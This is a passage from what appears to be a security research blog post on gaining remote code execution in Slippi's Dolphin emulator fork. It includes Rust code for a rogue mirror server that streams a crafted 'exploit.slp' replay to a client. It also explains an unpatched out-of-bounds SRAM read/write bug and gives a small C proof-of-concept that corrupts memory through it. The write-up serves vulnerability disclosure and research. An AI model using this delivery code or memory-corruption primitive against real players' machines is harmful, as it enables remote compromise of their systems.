+<span class=giallo-l><span style=color:#569cd6>                        let</span><span style=color:#9cdcfe> request</span><span style=color:#d4d4d4> =</span><span> serde_json</span><span style=color:#d4d4d4>::</span><span style=color:#dcdcaa>from_str</span><span style=color:#d4d4d4>::</span><span>&lt;</span><span style=color:#4ec9b0>MirrorRequest</span><span>>(</span><span style=color:#9cdcfe>message</span><span>)</span><span style=color:#d4d4d4>.</span><span style=color:#dcdcaa>unwrap</span><span>();</span></span>
+<span class=giallo-l><span style=color:#c586c0>                        match</span><span style=color:#9cdcfe> request</span><span> {</span></span>
+<span class=giallo-l><span style=color:#4ec9b0>                            MirrorRequest</span><span style=color:#d4d4d4>::</span><span style=color:#4ec9b0>ConnectRequest</span><span> {</span><span style=color:#569cd6> mut</span><span style=color:#9cdcfe> cursor</span><span> }</span><span style=color:#d4d4d4> =></span><span> {</span></span>
+<span class=giallo-l><span style=color:#dcdcaa>                                println!</span><span>(</span><span style=color:#ce9178>"Sending reply"</span><span>);</span></span>
+<span class=giallo-l><span style=color:#dcdcaa>                                send_packet</span><span>(MirrorResponse</span><span style=color:#d4d4d4>::</span><span style=color:#4ec9b0>ConnectReply</span><span> {</span></span>
+<span class=giallo-l><span style=color:#9cdcfe>                                    nick</span><span style=color:#d4d4d4>:</span><span style=color:#ce9178> "Slippi Online"</span><span>,</span></span>
+<span class=giallo-l><span style=color:#9cdcfe>                                    version</span><span style=color:#d4d4d4>:</span><span style=color:#ce9178> "3.5.1"</span><span>,</span></span>
+<span class=giallo-l><span style=color:#9cdcfe>                                    cursor</span><span>,</span></span>
+<span class=giallo-l><span>                                });</span></span>
+<span class=giallo-l></span>
+<span class=giallo-l><span style=color:#dcdcaa>                                println!</span><span>(</span><span style=color:#ce9178>"Waiting a bit..."</span><span>);</span></span>
+<span class=giallo-l><span>                                std</span><span style=color:#d4d4d4>::</span><span>thread</span><span style=color:#d4d4d4>::</span><span style=color:#dcdcaa>sleep</span><span>(Duration</span><span style=color:#d4d4d4>::</span><span style=color:#dcdcaa>from_secs</span><span>(</span><span style=color:#b5cea8>10</span><span>));</span></span>
+<span class=giallo-l></span>
+<span class=giallo-l><span style=color:#dcdcaa>                                println!</span><span>(</span><span style=color:#ce9178>"Sending replay data..."</span><span>);</span></span>
+<span class=giallo-l><span style=color:#dcdcaa>                                send_packet</span><span>(MirrorResponse</span><span style=color:#d4d4d4>::</span><span style=color:#4ec9b0>StartGame</span><span> {</span></span>
+<span class=giallo-l><span style=color:#9cdcfe>                                    cursor</span><span>,</span></span>
+<span class=giallo-l><span style=color:#9cdcfe>                                    next_cursor</span><span style=color:#d4d4d4>:</span><span style=color:#9cdcfe> cursor</span><span style=color:#d4d4d4> +</span><span style=color:#b5cea8> 1</span><span>,</span></span>
+<span class=giallo-l><span>                                });</span></span>
+<span class=giallo-l><span style=color:#9cdcfe>                                cursor</span><span style=color:#d4d4d4> +=</span><span style=color:#b5cea8> 1</span><span>;</span></span>
+<span class=giallo-l></span>
+<span class=giallo-l><span style=color:#569cd6>                                let mut</span><span style=color:#9cdcfe> cmd_lengths</span><span style=color:#d4d4d4>:</span><span style=color:#4ec9b0> HashMap</span><span>&lt;</span><span style=color:#4ec9b0>u8</span><span>,</span><span style=color:#4ec9b0> u16</span><span>></span><span style=color:#d4d4d4> =</span><span style=color:#4ec9b0> HashMap</span><span style=color:#d4d4d4>::</span><span style=color:#dcdcaa>new</span><span>();</span></span>
+<span class=giallo-l></span>
+<span class=giallo-l><span style=color:#569cd6>                                let mut</span><span style=color:#9cdcfe> reader</span><span style=color:#d4d4d4> =</span></span>
+<span class=giallo-l><span style=color:#4ec9b0>                                    BufReader</span><span style=color:#d4d4d4>::</span><span style=color:#dcdcaa>new</span><span>(File</span><span style=color:#d4d4d4>::</span><span style=color:#dcdcaa>open</span><span>(</span><span style=color:#ce9178>"../gecko/exploit.slp"</span><span>)</span><span style=color:#d4d4d4>.</span><span style=color:#dcdcaa>unwrap</span><span>());</span></span>
+<span class=giallo-l><span style=color:#9cdcfe>                                reader</span><span style=color:#d4d4d4>.</span><span style=color:#dcdcaa>seek</span><span>(SeekFrom</span><span style=color:#d4d4d4>::</span><span style=color:#dcdcaa>Start</span><span>(</span><span style=color:#b5cea8>0xF</span><span>))</span><span style=color:#d4d4d4>.</span><span style=color:#dcdcaa>unwrap</span><span>();</span></span>
+<span class=giallo-l><span style=color:#c586c0>                                loop</span><span> {</span></span>
+<span class=giallo-l><span style=color:#569cd6>                                    let</span><span style=color:#9cdcfe> cmd</span><span style=color:#d4d4d4> =</span><span style=color:#9cdcfe> reader</span><span style=color:#d4d4d4>.</span><span style=color:#dcdcaa>read_u8</span><span>()</span><span style=color:#d4d4d4>.</span><span style=color:#dcdcaa>unwrap</span><span>();</span></span>
+<span class=giallo-l><span style=color:#dcdcaa>                                    println!</span><span>(</span><span style=color:#ce9178>"Handling event 0x{cmd:X}"</span><span>);</span></span>
+<span class=giallo-l></span>
+<span class=giallo-l><span style=color:#c586c0>                                    match</span><span style=color:#9cdcfe> cmd</span><span> {</span></span>
+<span class=giallo-l><span style=color:#6a9955>                                        // Event Payloads</span></span>
+<span class=giallo-l><span style=color:#b5cea8>                                        0x35</span><span style=color:#d4d4d4> =></span><span> {</span></span>
+<span class=giallo-l><span style=color:#569cd6>                                            let</span><span style=color:#9cdcfe> size</span><span style=color:#d4d4d4> =</span><span style=color:#9cdcfe> reader</span><span style=color:#d4d4d4>.</span><span style=color:#dcdcaa>read_u8</span><span>()</span><span style=color:#d4d4d4>.</span><span style=color:#dcdcaa>unwrap</span><span>();</span></span>
+<span class=giallo-l><span style=color:#569cd6>                                            let</span><span style=color:#9cdcfe> event_buf</span><span style=color:#d4d4d4> =</span><span> {</span></span>
+<span class=giallo-l><span style=color:#569cd6>                                                let mut</span><span style=color:#9cdcfe> buf</span><span style=color:#d4d4d4> =</span><span style=color:#dcdcaa> vec!</span><span>[</span><span style=color:#b5cea8>0</span><span style=color:#4ec9b0>u8</span><span>;</span><span style=color:#9cdcfe> size</span><span style=color:#569cd6> as</span><span style=color:#4ec9b0> usize</span><span style=color:#d4d4d4> +</span><span style=color:#b5cea8> 1</span><span>];</span></span>
+<span class=giallo-l><span style=color:#9cdcfe>                                                buf</span><span>[</span><span style=color:#b5cea8>0</span><span>]</span><span style=color:#d4d4d4> =</span><span style=color:#9cdcfe> cmd</span><span>;</span></span>
+<span class=giallo-l><span style=color:#9cdcfe>                                                buf</span><span>[</span><span style=color:#b5cea8>1</span><span>]</span><span style=color:#d4d4d4> =</span><span style=color:#9cdcfe> size</span><span>;</span></span>
+<span class=giallo-l><span style=color:#9cdcfe>                                                reader</span><span style=color:#d4d4d4>.</span><span style=color:#dcdcaa>read_exact</span><span>(</span><span style=color:#d4d4d4>&</span><span style=color:#569cd6>mut</span><span style=color:#9cdcfe> buf</span><span>[</span><span style=color:#b5cea8>2</span><span style=color:#d4d4d4>..</span><span>])</span><span style=color:#d4d4d4>.</span><span style=color:#dcdcaa>unwrap</span><span>();</span></span>
+<span class=giallo-l><span style=color:#9cdcfe>                                                buf</span></span>
+<span class=giallo-l><span>                                            };</span></span>
+<span class=giallo-l><span style=color:#569cd6>                                            let mut</span><span style=color:#9cdcfe> event_reader</span><span style=color:#d4d4d4> =</span><span style=color:#4ec9b0> Cursor</span><span style=color:#d4d4d4>::</span><span style=color:#dcdcaa>new</span><span>(</span><span style=color:#d4d4d4>&</span><span style=color:#9cdcfe>event_buf</span><span>[</span><span style=color:#b5cea8>2</span><span style=color:#d4d4d4>..</span><span>]);</span></span>
+<span class=giallo-l></span>
+<span class=giallo-l><span style=color:#c586c0>                                            for</span><span style=color:#9cdcfe> _</span><span style=color:#569cd6> in</span><span style=color:#b5cea8> 0</span><span style=color:#d4d4d4>..</span><span style=color:#9cdcfe>size</span><span style=color:#d4d4d4> /</span><span style=color:#b5cea8> 3</span><span> {</span></span>
+<span class=giallo-l><span style=color:#9cdcfe>                                                cmd_lengths</span><span style=color:#d4d4d4>.</span><span style=color:#dcdcaa>insert</span><span>(</span></span>
+<span class=giallo-l><span style=color:#9cdcfe>                                                    event_reader</span><span style=color:#d4d4d4>.</span><span style=color:#dcdcaa>read_u8</span><span>()</span><span style=color:#d4d4d4>.</span><span style=color:#dcdcaa>unwrap</span><span>(),</span></span>
+<span class=giallo-l><span style=color:#9cdcfe>                                                    event_reader</span></span>
+<span class=giallo-l><span style=color:#d4d4d4>                                                        .</span><span style=color:#dcdcaa>read_u16</span><span style=color:#d4d4d4>::</span><span>&lt;byteorder</span><span style=color:#d4d4d4>::</span><span style=color:#4ec9b0>BigEndian</span><span>>()</span></span>
+<span class=giallo-l><span style=color:#d4d4d4>                                                        .</span><span style=color:#dcdcaa>unwrap</span><span>(),</span></span>
+<span class=giallo-l><span>                                                );</span></span>
+<span class=giallo-l><span>                                            }</span></span>
+<span class=giallo-l></span>
+<span class=giallo-l><span style=color:#569cd6>                                            let</span><span style=color:#9cdcfe> payload</span><span style=color:#d4d4d4> =</span><span> BASE64_STANDARD</span><span style=color:#d4d4d4>.</span><span style=color:#dcdcaa>encode</span><span>(</span><span style=color:#d4d4d4>&</span><span style=color:#9cdcfe>event_buf</span><span>);</span></span>
+<span class=giallo-l><span style=color:#dcdcaa>                                            send_packet</span><span>(MirrorResponse</span><span style=color:#d4d4d4>::</span><span style=color:#4ec9b0>GameEvent</span><span> {</span></span>
+<span class=giallo-l><span style=color:#9cdcfe>                                                payload</span><span style=color:#d4d4d4>: &</span><span style=color:#9cdcfe>payload</span><span>,</span></span>
+<span class=giallo-l><span style=color:#9cdcfe>                                                cursor</span><span style=color:#d4d4d4>:</span><span style=color:#9cdcfe> cursor</span><span>,</span></span>
+<span class=giallo-l><span style=color:#9cdcfe>                                                next_cursor</span><span style=color:#d4d4d4>:</span><span style=color:#9cdcfe> cursor</span><span style=color:#d4d4d4> +</span><span style=color:#b5cea8> 1</span><span>,</span></span>
+<span class=giallo-l><span>                                            });</span></span>
+<span class=giallo-l><span style=color:#9cdcfe>                                            cursor</span><span style=color:#d4d4d4> +=</span><span style=color:#b5cea8> 1</span><span>;</span></span>
+<span class=giallo-l><span>                                        }</span></span>
+<span class=giallo-l><span style=color:#9cdcfe>                                        x</span><span style=color:#d4d4d4> =></span><span> {</span></span>
+<span class=giallo-l><span style=color:#c586c0>                                            if</span><span style=color:#569cd6> let</span><span style=color:#4ec9b0> Some</span><span>(</span><span style=color:#d4d4d4>&</span><span style=color:#9cdcfe>length</span><span>)</span><span style=color:#d4d4d4> =</span><span style=color:#9cdcfe> cmd_lengths</span><span style=color:#d4d4d4>.</span><span style=color:#dcdcaa>get</span><span>(</span><span style=color:#d4d4d4>&</span><span style=color:#9cdcfe>x</span><span>) {</span></span>
+<span class=giallo-l><span style=color:#569cd6>                                                let mut</span><span style=color:#9cdcfe> data</span><span style=color:#d4d4d4> =</span><span style=color:#dcdcaa> vec!</span><span>[</span><span style=color:#b5cea8>0</span><span style=color:#4ec9b0>u8</span><span>;</span><span style=color:#9cdcfe> length</span><span style=color:#569cd6> as</span><span style=color:#4ec9b0> usize</span><span style=color:#d4d4d4> +</span><span style=color:#b5cea8> 1</span><span>];</span></span>
+<span class=giallo-l><span style=color:#9cdcfe>                                                data</span><span>[</span><span style=color:#b5cea8>0</span><span>]</span><span style=color:#d4d4d4> =</span><span style=color:#9cdcfe> x</span><span>;</span></span>
+<span class=giallo-l><span style=color:#9cdcfe>                                                reader</span><span style=color:#d4d4d4>.</span><span style=color:#dcdcaa>read_exact</span><span>(</span><span style=color:#d4d4d4>&</span><span style=color:#569cd6>mut</span><span style=color:#9cdcfe> data</span><span>[</span><span style=color:#b5cea8>1</span><span style=color:#d4d4d4>..</span><span>])</span><span style=color:#d4d4d4>.</span><span style=color:#dcdcaa>unwrap</span><span>();</span></span>
+<span class=giallo-l></span>
+<span class=giallo-l><span style=color:#569cd6>                                                let</span><span style=color:#9cdcfe> payload</span><span style=color:#d4d4d4> =</span><span> BASE64_STANDARD</span><span style=color:#d4d4d4>.</span><span style=color:#dcdcaa>encode</span><span>(</span><span style=color:#9cdcfe>data</span><span>);</span></span>
+<span class=giallo-l><span style=color:#dcdcaa>                                                send_packet</span><span>(MirrorResponse</span><span style=color:#d4d4d4>::</span><span style=color:#4ec9b0>GameEvent</span><span> {</span></span>
+<span class=giallo-l><span style=color:#9cdcfe>                                                    payload</span><span style=color:#d4d4d4>: &</span><span style=color:#9cdcfe>payload</span><span>,</span></span>
+<span class=giallo-l><span style=color:#9cdcfe>                                                    cursor</span><span style=color:#d4d4d4>:</span><span style=color:#9cdcfe> cursor</span><span>,</span></span>
+<span class=giallo-l><span style=color:#9cdcfe>                                                    next_cursor</span><span style=color:#d4d4d4>:</span><span style=color:#9cdcfe> cursor</span><span style=color:#d4d4d4> +</span><span style=color:#b5cea8> 1</span><span>,</span></span>
+<span class=giallo-l><span>                                                });</span></span>
+<span class=giallo-l><span style=color:#9cdcfe>                                                cursor</span><span style=color:#d4d4d4> +=</span><span style=color:#b5cea8> 1</span><span>;</span></span>
+<span class=giallo-l><span>                                            }</span><span style=color:#c586c0> else</span><span> {</span></span>
+<span class=giallo-l><span style=color:#dcdcaa>                                                println!</span><span>(</span><span style=color:#ce9178>"Unhandled command! Stopping..."</span><span>);</span></span>
+<span class=giallo-l><span style=color:#c586c0>                                                break</span><span>;</span></span>
+<span class=giallo-l><span>                                            }</span></span>
+<span class=giallo-l><span>                                        }</span></span>
+<span class=giallo-l><span>                                    }</span></span>
+<span class=giallo-l><span>                                }</span></span>
+<span class=giallo-l></span>
+<span class=giallo-l><span style=color:#dcdcaa>                                println!</span><span>(</span><span style=color:#ce9178>"Should be done now!"</span><span>);</span></span>
+<span class=giallo-l><span>                            }</span></span>
+<span class=giallo-l><span>                        }</span></span>
+<span class=giallo-l><span>                    }</span></span>
+<span class=giallo-l><span>                }</span></span>
+<span class=giallo-l><span>            }</span></span>
+<span class=giallo-l><span>        }</span></span>
+<span class=giallo-l><span>        std</span><span style=color:#d4d4d4>::</span><span>thread</span><span style=color:#d4d4d4>::</span><span style=color:#dcdcaa>sleep</span><span>(Duration</span><span style=color:#d4d4d4>::</span><span style=color:#dcdcaa>from_millis</span><span>(</span><span style=color:#b5cea8>10</span><span>));</span></span>
+<span class=giallo-l><span>    }</span></span>
+<span class=giallo-l><span>}</span></span></code></pre><p>And with that, I now have a way of getting arbitrary guest code execution remotely! That was a lot of preparation work without any real exploits being written yet, but at least I can finally get to the fun part now.<h1 id=breaking-out-of-dolphin>Breaking out of Dolphin<a aria-label="Anchor link for: breaking-out-of-dolphin" class=zola-anchor href=#breaking-out-of-dolphin><i class="fas fa-link"></i></a></h1><p>When it comes to memory safety vulnerabilities, <a href=https://dougallj.wordpress.com/2016/11/13/exploiting-dolphin-part-1/ rel=external>console</a> <a href="https://www.youtube.com/watch?v=Q3SOYneC7mU" rel=external>emulators</a> <a href="https://www.youtube.com/watch?v=L-L8qWpd_74" rel=external>don't</a> <a href="https://www.youtube.com/watch?v=mHSWxxK6nA8" rel=external>have</a> <a href="https://www.youtube.com/watch?v=zqUYNYWPlpQ" rel=external>the</a> <a href=https://github.com/khang06/HackerSM64-emu-escape rel=external>best</a> <a href=https://tasvideos.org/8982S rel=external>track</a> <a href=https://github.com/n64dev/cen64/issues/122 rel=external>record</a> <em>(yes, those are all separate links)</em>. It's probably some combination of many popular ones having codebases dating back to the early 2000s, the need to emulate lots of different block copies for DMA, and there being more of a focus on just getting the games to work instead of hardening against potentially malicious code. Either way, I think there isn't enough vulnerability research that targets them, given that random ROM hacks or <em>Totally Legitimately Acquired Game Backups</em> also count as untrusted code.<p>Thankfully for me, in the case of Dolphin, I don't even have to find the vulnerability myself! One of the first changes mentioned in <a href=https://dolphin-emu.org/blog/2024/04/30/dolphin-progress-report-february-march-and-april-2024/ rel=external>Dolphin's February, March, and April 2024 Progress Report</a> is a patch for an easily controllable out-of-bounds read/write, followed by a few paragraphs about why patching these kinds of bugs is important.<p><img alt src=/img/slippirce/dolphinvuln.png><p>The GameCube has a 64-byte region of battery-backed SRAM that it uses to keep track of some basic information like audio settings, screen offset, language (PAL only), and the real-time clock. All of this is configured in the GameCube's Initial Program Loader (IPL), also known as that big cube menu with all of the settings and memory card stuff.<p><img alt src=/img/slippirce/ipl.png><p>This area isn't mapped directly in memory anywhere, but is instead accessed via the External Interface (EXI) bus. This means that data has to be copied to and from main memory via DMA in order to be accessed. Hey, didn't I say something about DMA in emulators leading to some issues earlier?<p>When an EXI DMA is started, Dolphin calls <code>IEXIDevice::DMAWrite</code> on the appropriate device.<pre class=giallo style=color:#e6e6e6;background-color:#222><code data-lang=cpp><span class=giallo-l><span style=color:#569cd6>void</span><span> IEXIDevice::</span><span style=color:#dcdcaa>DMAWrite</span><span>(</span><span style=color:#4ec9b0>u32</span><span style=color:#9cdcfe> _uAddr</span><span>,</span><span style=color:#4ec9b0> u32</span><span style=color:#9cdcfe> _uSize</span><span>)</span></span>
+<span class=giallo-l><span>{</span></span>
+<span class=giallo-l><span style=color:#6a9955>    // _dbg_assert_(EXPANSIONINTERFACE, 0);</span></span>
+<span class=giallo-l><span style=color:#c586c0>    while</span><span> (_uSize</span><span style=color:#d4d4d4>--</span><span>)</span></span>
+<span class=giallo-l><span>    {</span></span>
+<span class=giallo-l><span>        u8 uByte </span><span style=color:#d4d4d4>=</span><span> Memory::</span><span style=color:#dcdcaa>Read_U8</span><span>(_uAddr</span><span style=color:#d4d4d4>++</span><span>);</span></span>
+<span class=giallo-l><span style=color:#dcdcaa>        TransferByte</span><span>(uByte);</span></span>
+<span class=giallo-l><span>    }</span></span>
+<span class=giallo-l><span>}</span></span></code></pre><p><code>IEXIDevice::TransferByte</code> is a virtual function overridden by each device, which in this case is <code>CEXIIPL</code>.<pre class=giallo style=color:#e6e6e6;background-color:#222><code data-lang=cpp><span class=giallo-l><span style=color:#569cd6>void</span><span> CEXIIPL::</span><span style=color:#dcdcaa>TransferByte</span><span>(</span><span style=color:#4ec9b0>u8</span><span style=color:#569cd6>&</span><span style=color:#9cdcfe> _uByte</span><span>)</span></span>
+<span class=giallo-l><span>{</span></span>
+<span class=giallo-l><span style=color:#6a9955>    // The first 4 bytes must be the address</span></span>
+<span class=giallo-l><span style=color:#6a9955>    // If we haven't read it, do it now</span></span>
+<span class=giallo-l><span style=color:#c586c0>    if</span><span> (m_uPosition </span><span style=color:#d4d4d4>&lt;=</span><span style=color:#b5cea8> 3</span><span>)</span></span>
+<span class=giallo-l><span>    {</span></span>
+<span class=giallo-l><span>        m_uAddress </span><span style=color:#d4d4d4>&lt;&lt;=</span><span style=color:#b5cea8> 8</span><span>;</span></span>
+<span class=giallo-l><span>        m_uAddress </span><span style=color:#d4d4d4>|=</span><span> _uByte;</span></span>
+<span class=giallo-l><span>        m_uRWOffset </span><span style=color:#d4d4d4>=</span><span style=color:#b5cea8> 0</span><span>;</span></span>
+<span class=giallo-l><span>        _uByte </span><span style=color:#d4d4d4>=</span><span style=color:#b5cea8> 0xFF</span><span>;</span></span>
+<span class=giallo-l></span>
+<span class=giallo-l><span style=color:#6a9955>        // Check if the command is complete</span></span>
+<span class=giallo-l><span style=color:#c586c0>        if</span><span> (m_uPosition </span><span style=color:#d4d4d4>==</span><span style=color:#b5cea8> 3</span><span>)</span></span>
+<span class=giallo-l><span>        {</span></span>
+<span class=giallo-l><span style=color:#6a9955>            // Get the time...</span></span>
+<span class=giallo-l><span style=color:#dcdcaa>            UpdateRTC</span><span>();</span></span>
+<span class=giallo-l></span>
+<span class=giallo-l><span style=color:#6a9955>            // ...</span></span>
+<span class=giallo-l><span>        }</span></span>
+<span class=giallo-l><span>    }</span></span>
+<span class=giallo-l><span style=color:#c586c0>    else</span></span>
+<span class=giallo-l><span>    {</span></span>
+<span class=giallo-l><span style=color:#6a9955>        // Actually read or write a byte</span></span>
+<span class=giallo-l><span style=color:#c586c0>        switch</span><span> (</span><span style=color:#dcdcaa>CommandRegion</span><span>())</span></span>
+<span class=giallo-l><span>        {</span></span>
+<span class=giallo-l><span style=color:#c586c0>        case</span><span> REGION_RTC:</span></span>
+<span class=giallo-l><span style=color:#c586c0>            if</span><span> (</span><span style=color:#dcdcaa>IsWriteCommand</span><span>())</span></span>
+<span class=giallo-l><span style=color:#9cdcfe>                m_RTC</span><span>[(m_uAddress </span><span style=color:#d4d4d4>&</span><span style=color:#b5cea8> 0x03</span><span>)</span><span style=color:#d4d4d4> +</span><span> m_uRWOffset]</span><span style=color:#d4d4d4> =</span><span> _uByte;</span></span>
+<span class=giallo-l><span style=color:#c586c0>            else</span></span>
+<span class=giallo-l><span>                _uByte </span><span style=color:#d4d4d4>=</span><span style=color:#9cdcfe> m_RTC</span><span>[(m_uAddress </span><span style=color:#d4d4d4>&</span><span style=color:#b5cea8> 0x03</span><span>)</span><span style=color:#d4d4d4> +</span><span> m_uRWOffset];</span></span>
+<span class=giallo-l><span style=color:#c586c0>            break</span><span>;</span></span>
+<span class=giallo-l></span>
+<span class=giallo-l><span style=color:#c586c0>        case</span><span> REGION_SRAM:</span></span>
+<span class=giallo-l><span style=color:#c586c0>            if</span><span> (</span><span style=color:#dcdcaa>IsWriteCommand</span><span>())</span></span>
+<span class=giallo-l><span style=color:#9cdcfe>                g_SRAM</span><span>.</span><span style=color:#9cdcfe>p_SRAM</span><span>[(m_uAddress </span><span style=color:#d4d4d4>&</span><span style=color:#b5cea8> 0x3F</span><span>)</span><span style=color:#d4d4d4> +</span><span> m_uRWOffset]</span><span style=color:#d4d4d4> =</span><span> _uByte;</span></span>
+<span class=giallo-l><span style=color:#c586c0>            else</span></span>
+<span class=giallo-l><span>                _uByte </span><span style=color:#d4d4d4>=</span><span style=color:#9cdcfe> g_SRAM</span><span>.</span><span style=color:#9cdcfe>p_SRAM</span><span>[(m_uAddress </span><span style=color:#d4d4d4>&</span><span style=color:#b5cea8> 0x3F</span><span>)</span><span style=color:#d4d4d4> +</span><span> m_uRWOffset];</span></span>
+<span class=giallo-l><span style=color:#c586c0>            break</span><span>;</span></span>
+<span class=giallo-l></span>
+<span class=giallo-l><span style=color:#6a9955>        // ...</span></span>
+<span class=giallo-l><span>        }</span></span>
+<span class=giallo-l></span>
+<span class=giallo-l><span>        m_uRWOffset</span><span style=color:#d4d4d4>++</span><span>;</span></span>
+<span class=giallo-l><span>    }</span></span>
+<span class=giallo-l></span>
+<span class=giallo-l><span>    m_uPosition</span><span style=color:#d4d4d4>++</span><span>;</span></span>
+<span class=giallo-l><span>}</span></span></code></pre><p><code>m_uRWOffset</code> is incremented for each byte accessed but is never checked against the bounds of <code>m_RTC</code> or <code>p_SRAM</code>, leading to a trivial out-of-bounds read and write primitive. To test this, I wrote a quick <a href=https://wiibrew.org/wiki/DevkitPPC rel=external>devkitPPC</a> program that writes a lot of garbage into SRAM.<pre class=giallo style=color:#e6e6e6;background-color:#222><code data-lang=c><span class=giallo-l><span style=color:#c586c0>#include</span><span style=color:#ce9178> &lt;string.h></span></span>
+<span class=giallo-l><span style=color:#c586c0>#include</span><span style=color:#ce9178> &lt;gccore.h></span></span>
+<span class=giallo-l></span>
+<span class=giallo-l><span style=color:#6a9955>// Adapted from internal libogc code</span></span>
+<span class=giallo-l><span style=color:#569cd6>static void</span><span style=color:#dcdcaa> __sram_write</span><span>(</span><span style=color:#569cd6>void</span><span style=color:#d4d4d4> *</span><span style=color:#9cdcfe>buffer</span><span>, u32 </span><span style=color:#9cdcfe>size</span><span>) {</span></span>
+<span class=giallo-l><span style=color:#dcdcaa>    EXI_Lock</span><span>(EXI_CHANNEL_0, EXI_DEVICE_1,</span><span style=color:#569cd6> NULL</span><span>);</span></span>
+<span class=giallo-l><span style=color:#dcdcaa>    EXI_Select</span><span>(EXI_CHANNEL_0, EXI_DEVICE_1, EXI_SPEED8MHZ);</span></span>
+<span class=giallo-l></span>
+<span class=giallo-l><span>    u32 cmd </span><span style=color:#d4d4d4>=</span><span style=color:#b5cea8> 0xA0000100</span><span>;</span></span>
+<span class=giallo-l><span style=color:#dcdcaa>    EXI_Imm</span><span>(EXI_CHANNEL_0,</span><span style=color:#d4d4d4> &</span><span>cmd,</span><span style=color:#b5cea8> 4</span><span>, EXI_WRITE,</span><span style=color:#569cd6> NULL</span><span>);</span></span>
+<span class=giallo-l><span style=color:#dcdcaa>    EXI_Sync</span><span>(EXI_CHANNEL_0);</span></span>
+<span class=giallo-l><span style=color:#dcdcaa>    EXI_Dma</span><span>(EXI_CHANNEL_0, buffer, size, EXI_WRITE,</span><span style=color:#569cd6> NULL</span><span>);</span></span>
+<span class=giallo-l><span>}</span></span>
+<span class=giallo-l></span>
+<span class=giallo-l><span style=color:#569cd6>int</span><span style=color:#dcdcaa> main</span><span>() {</span></span>
+<span class=giallo-l><span style=color:#569cd6>    static char</span><span style=color:#9cdcfe> dummy</span><span>[</span><span style=color:#b5cea8>1024</span><span>];</span></span>
+<span class=giallo-l><span style=color:#dcdcaa>    memset</span><span>(dummy,</span><span style=color:#b5cea8> 0x41</span><span>,</span><span style=color:#569cd6> sizeof</span><span>(dummy));</span></span>
+<span class=giallo-l><span style=color:#dcdcaa>    __sram_write</span><span>(dummy,</span><span style=color:#569cd6> sizeof</span><span>(dummy));</span></span>
+<span class=giallo-l><span>}</span></span></code></pre><p><img alt src=/img/slippirce/memcorrupt.png><p>A free bug that looks exploitable! Nice!<p>...Wait, that bug was patched two years ago. Why is this Dolphin vulnerable? To answer that, we need a short history lesson.<p>A long time ago, a developer named Tino created a fork of Dolphin called <a href=https://forums.dolphin-emu.org/Thread-unofficial-ishiiruka-dolphin-custom-version rel=external>Ishiiruka</a>, which aimed to be a fork that maintained support and improved performance on older hardware but at the cost of accuracy and stability due to some of the hacky workarounds it used. It hasn't been updated since around 2021 and seemed to diverge quite a bit from upstream even back then.<p>However, there was <em>another</em> fork of Dolphin called <a href=https://github.com/FasterMelee/Ishiiruka rel=external>Faster Melee</a>, which, as the name implies, was a fork of Dolphin based on Ishiiruka that was specifically tailored for getting better performance out of Dolphin with its built-in Netplay code on Melee. As you might've guessed from the fact that Slippi's Dolphin still says "Faster Melee" in its titlebar, this is what Slippi's build was forked off of. According to the commit history, it seems like FM was last synced with Ishiiruka all the way back in July 2017.<p>If you think being based on an ancient version of Dolphin from almost a decade ago sounds like it would be really annoying for the developers, you'd be completely right as far as I can tell. There's currently a <a href=https://github.com/project-slippi/dolphin rel=external>work-in-progress port of Slippi to mainline Dolphin</a>, but it's currently only considered an opt-in beta build. Also, Slippi uses two separate builds of Dolphin: one for actual gameplay and one for replay playback. The mainline Dolphin version currently only supports gameplay, so all replays are played back on Ishiiruka builds.<p>Anyway, back to figuring out how to exploit the bug. <code>p_SRAM</code> is just the raw byte array representation of the <code>SRAM</code> union and isn't a pointer:<pre class=giallo style=color:#e6e6e6;background-color:#222><code data-lang=cpp><span class=giallo-l><span style=color:#569cd6>union</span><span style=color:#4ec9b0> SRAM</span><span> {</span></span>
+<span class=giallo-l><span>    u8 </span><span style=color:#9cdcfe>p_SRAM</span><span>[</span><span style=color:#b5cea8>64</span><span>];</span></span>
+<span class=giallo-l><span style=color:#569cd6>    struct</span><span style=color:#6a9955>  // Stored configuration value from the system SRAM area</span></span>
+<span class=giallo-l><span>    {</span></span>
+<span class=giallo-l><span>        u16 checksum;</span><span style=color:#6a9955>        // Holds the block checksum.</span></span>
+<span class=giallo-l><span>        u16 checksum_inv;</span><span style=color:#6a9955>    // Holds the inverse block checksum</span></span>
+<span class=giallo-l><span>        u32 ead0;</span><span style=color:#6a9955>            // Unknown attribute</span></span>
+<span class=giallo-l><span>        u32 ead1;</span><span style=color:#6a9955>            // Unknown attribute</span></span>
+<span class=giallo-l><span>        u32 counter_bias;</span><span style=color:#6a9955>    // Bias value for the realtime clock</span></span>
+<span class=giallo-l><span>        s8 display_offsetH;</span><span style=color:#6a9955>  // Pixel offset for the VI</span></span>
+<span class=giallo-l><span>        u8 ntd;</span><span style=color:#6a9955>              // Unknown attribute</span></span>
+<span class=giallo-l><span>        u8 lang;</span><span style=color:#6a9955>             // Language of system</span></span>
+<span class=giallo-l><span>        SRAMFlags flags;</span><span style=color:#6a9955>     // Device and operations flag</span></span>
+<span class=giallo-l></span>
+<span class=giallo-l><span style=color:#6a9955>        // Stored configuration value from the extended SRAM area</span></span>
+<span class=giallo-l><span>        u8 </span><span style=color:#9cdcfe>flash_id</span><span>[</span><span style=color:#b5cea8>2</span><span>][</span><span style=color:#b5cea8>12</span><span>];</span><span style=color:#6a9955>     // flash_id[2][12] 96bit memorycard unlock flash ID</span></span>
+<span class=giallo-l><span>        u32 wirelessKbd_id;</span><span style=color:#6a9955>     // Device ID of last connected wireless keyboard</span></span>
+<span class=giallo-l><span>        u16 </span><span style=color:#9cdcfe>wirelessPad_id</span><span>[</span><span style=color:#b5cea8>4</span><span>];</span><span style=color:#6a9955>  // 16-bit device ID of last connected pad.</span></span>
+<span class=giallo-l><span>        u8 dvderr_code;</span><span style=color:#6a9955>         // last non-recoverable error from DVD interface</span></span>
+<span class=giallo-l><span>        u8 __padding0;</span><span style=color:#6a9955>          // reserved</span></span>
+<span class=giallo-l><span>        u8 </span><span style=color:#9cdcfe>flashID_chksum</span><span>[</span><span style=color:#b5cea8>2</span><span>];</span><span style=color:#6a9955>   // 8-bit checksum of unlock flash ID</span></span>
+<span class=giallo-l><span>        u32 __padding1;</span><span style=color:#6a9955>         // padding</span></span>
+<span class=giallo-l><span>    };</span></span>
